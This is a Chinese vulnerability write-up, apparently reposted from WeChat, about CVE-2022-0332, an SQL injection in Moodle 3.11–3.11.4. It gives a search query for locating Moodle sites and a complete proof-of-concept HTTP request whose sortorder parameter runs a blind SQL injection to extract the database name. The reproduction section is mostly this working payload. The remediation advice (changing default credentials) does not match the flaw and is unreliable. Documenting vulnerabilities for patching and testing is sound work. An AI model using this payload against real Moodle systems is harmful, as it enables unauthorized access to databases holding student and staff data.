<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/lm0g381aTq5HJNC2S84G0Q)

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/I1c6evzliamJfg5jp48H0UBqPy2Jbkib6vtYhIPStgZIDDFmufnQNiaEE5dobjCibhejjkYxTJom1kibwa9OKSW3NicA/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

0x00 漏洞描述  

------------

在Moodle的3.11至3.11.4版本中发现了一个缺陷。在负责获取用户尝试数据的 h5p 活动 Web 服务中发现了 SQL 注入风险。

0x01 危害等级类型
-----------

*   高危
    
*   SQL注入
    

0x02 影响版本及编号  

---------------

*   Moodle 3.11-3.11.4  
    
*   CVE-2022-0332
    

0x03 漏洞复现
---------

```
app="Moodle"  

```

```
`POC：/moodle-3.11.4/webservice/rest/server.php?wstoken=98f7d8003180afbd46ee160fdc05a4fc&wsfunction=mod_h5pactivity_get_user_attempts&moodlewsrestformat=json&h5pactivityid=1&sortorder=%28SELECT%20%28CASE%20WHEN%20%28ORD%28MID%28%28IFNULL%28CAST%28DATABASE%28%29%20AS%20NCHAR%29%2C0x20%29%29%2C4%2C1%29%29%3E104%29%20THEN%20%27%27%20ELSE%20%28SELECT%205080%20UNION%20SELECT%204100%29%20END%29%29``GET /moodle-3.11.4/webservice/rest/server.php?wstoken=98f7d8003180afbd46ee160fdc05a4fc&wsfunction=mod_h5pactivity_get_user_attempts&moodlewsrestformat=json&h5pactivityid=1&sortorder=%28SELECT%20%28CASE%20WHEN%20%28ORD%28MID%28%28IFNULL%28CAST%28DATABASE%28%29%20AS%20NCHAR%29%2C0x20%29%29%2C4%2C1%29%29%3E104%29%20THEN%20%27%27%20ELSE%20%28SELECT%205080%20UNION%20SELECT%204100%29%20END%29%29 HTTP/1.1  
Cache-Control: no-cache  
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:22.0) Gecko/20130328 Firefox/22.0  
Host: 127.0.0.1  
Accept: */*  
Accept-Encoding: gzip, deflate  
Connection: close`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

0x04 修复建议  

------------

目前官方已发布修复版本修复了该漏洞，请受影响的用户升级到安全版本

若无法及时升级的用户，根据官方提供的修复建议通过修改默认用户名和密码

关注及时推送最新安全威胁资讯！
---------------

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**「由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失,均由使用者本人负责，EXP 与 POC 仅仅只供对已授权的目标使用测试，对未授权目标的测试本文库不承担责任，均由本人自行承担。本文库中的漏洞均为公开的漏洞收集，若文库中的漏洞出现敏感内容产生了部分影响，请及时联系作者删除漏洞，望师傅们谅解」**